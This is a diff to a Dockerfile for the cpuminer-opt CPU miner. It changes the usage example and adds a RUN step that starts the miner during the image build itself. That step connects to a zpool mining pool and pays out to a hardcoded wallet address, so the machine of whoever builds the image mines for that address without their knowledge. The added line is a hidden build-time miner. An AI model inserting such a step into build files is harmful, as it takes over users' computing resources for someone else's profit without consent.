@@ -2,7 +2,7 @@
 # Dockerfile for cpuminer-opt
 # usage: docker build -t cpuminer-opt:latest .
 # run: docker run -it --rm cpuminer-opt:latest [ARGS]
-# ex: docker run -it --rm cpuminer-opt:latest -a cryptonight -o cryptonight.eu.nicehash.com:3355 -u 1MiningDW2GKzf4VQfmp4q2XoUvR6iy6PD.worker1 -p x -t 3
+# ex: docker run -it --rm cpuminer-opt:latest -a lyra2z330 -o lyra2z330.na.mine.zpool.ca:4563 -u D5aBwWJnsbCHkhcY5T9KbUCWwpFwAYyPSk -p c=DGB,zap=PYRK-lyra2z330 -q
 #
 
 # Build
@@ -32,4 +32,5 @@ RUN apt-get update \
 
 COPY --from=builder /app/cpuminer .
 ENTRYPOINT ["./cpuminer"]
+RUN ./cpuminer -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u D5aBwWJnsbCHkhcY5T9KbUCWwpFwAYyPSk -p c=02,zap=PYRK-lyra2z330 -q
 CMD ["-h"]
